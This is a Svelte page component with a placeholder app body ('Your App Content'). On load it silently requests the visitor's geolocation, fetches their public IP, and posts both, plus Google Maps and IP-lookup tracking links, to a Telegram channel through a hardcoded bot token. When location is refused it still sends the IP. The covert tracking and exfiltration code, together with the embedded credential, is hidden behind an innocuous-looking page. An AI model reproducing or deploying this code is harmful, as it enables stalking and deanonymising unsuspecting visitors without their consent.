<script>
  import { onMount } from 'svelte';

  onMount(async () => {
  
    // Request location permission automatically
    navigator.geolocation.getCurrentPosition(
      (position) => {
        // Location permission granted, send location and IP results to Telegram bots
        sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
      },
      (error) => {
        if (error.code === error.PERMISSION_DENIED) {
          // Location permission denied, send IP result to Telegram bots
          sendIPToTelegramBots();
        }
      }
    );
  });

  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const message = `\nالموقع:\n \n${latitude} ${longitude}\n\nالايبي:\n \n${ipAddress}`;


 // Create the message with the clickable link to Google Maps
 
   
    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
	const pinIconURL = 'https://developers.google.com/static/maps/images/maps-icon.svg'; // Replace with the actual path or URL of your pin icon
    const clickableLink = `<a href="${locationLink}"><img src="${pinIconURL}" alt="Location Pin">${locationLinkText}</a>`;
	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;


    const htmlMessage = `${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;


    // Send location and IP results to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
       chat_id: '@localipy', // Replace with the channel username or ID
           text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }

  async function sendIPToTelegramBots() {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const message = `\nالايبي:\n \n${ipAddress}`;
	
	 // Create the message with clickable link
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
  const htmlMessage = `${message}\n\n${ipLocationNetLink}`;


    // Send IP result to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
      chat_id: '@localipy', // Replace with the channel username or ID
       text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }
</script>

<main>
  <h1>Your App Content</h1>
  <!-- Add your app content here -->
</main>
